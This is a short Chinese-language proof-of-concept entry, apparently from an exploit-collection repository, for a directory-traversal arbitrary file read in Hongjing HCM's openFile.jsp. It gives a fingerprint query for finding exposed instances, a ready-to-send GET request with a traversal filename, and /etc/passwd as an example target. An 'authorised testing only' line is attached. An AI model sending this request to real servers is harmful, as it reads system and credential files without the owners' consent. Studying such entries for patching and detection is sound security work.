---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM openFile.jsp 任意文件读取漏洞

## 漏洞描述

宏景HCM `/templates/attestation/../../general/muster/hmuster/openFile.jsp` 接口 `filename` 参数存在目录遍历任意文件读取漏洞。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /templates/attestation/../../general/muster/hmuster/openFile.jsp?filename=../webapps/hrms/general/muster/hmuster/openFile.jsp HTTP/1.1
```

`filename` 穿越可读任意文件，如 `../../../../etc/passwd`。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
